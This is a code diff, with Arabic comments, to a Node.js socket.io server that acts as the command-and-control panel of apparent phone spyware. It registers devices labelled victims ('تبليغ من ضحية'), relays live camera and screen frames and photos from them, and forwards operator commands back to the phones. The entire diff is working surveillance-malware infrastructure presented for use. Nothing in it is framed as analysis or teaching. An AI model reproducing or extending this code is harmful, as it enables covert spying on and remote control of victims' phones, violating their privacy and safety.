@@ -9,15 +9,16 @@ const io = require('socket.io')(http, {
 app.get('/', (req, res) => { res.sendFile(__dirname + '/index.html'); });
 
 io.on('connection', (socket) => {
-    console.log('[-] مستخدم جديد متصل');
+    console.log('[-] نفق اتصال جديد: ' + socket.id);
 
-    // استقبال التبليغ من الهاتف وإرساله للوحة التحكم
+    // استقبال التبليغ من الهاتف وإرساله للوحة
     socket.on('victim_online', (data) => {
-        console.log('[!] تبليغ جديد من: ' + data.model);
+        console.log('[!] تبليغ من ضحية: ' + data.model);
+        // نستخدم io.emit لإرسالها لجميع المتصفحات المفتوحة
         io.emit('new_victim_alert', { id: socket.id, model: data.model });
     });
 
-    // تمرير فريمات الفيديو (كاميرا وشاشة)
+    // تمرير البث الحي
     socket.on('video_frame', (frame) => {
         socket.broadcast.emit('display_frame', { frame: frame });
     });
@@ -27,12 +28,12 @@ io.on('connection', (socket) => {
         socket.broadcast.emit('display_photo', { img: img });
     });
 
-    // تمرير الأوامر للهاتف
+    // استقبال الأوامر من اللوحة وتوجيهها للهاتف
     socket.on('admin_command', (data) => {
-        io.emit(data.command, data); // إرسال الأمر للجميع لضمان وصوله للهاتف
+        console.log('[>] أمر مرسل: ' + data.command);
+        io.emit(data.command, data); 
     });
 });
 
-http.listen(process.env.PORT || 8080, '0.0.0.0', () => {
-    console.log('🚀 Server is running on port ' + (process.env.PORT || 8080));
-});
+const PORT = process.env.PORT || 8080;
+http.listen(PORT, '0.0.0.0', () => console.log('🚀 Server running on port ' + PORT));
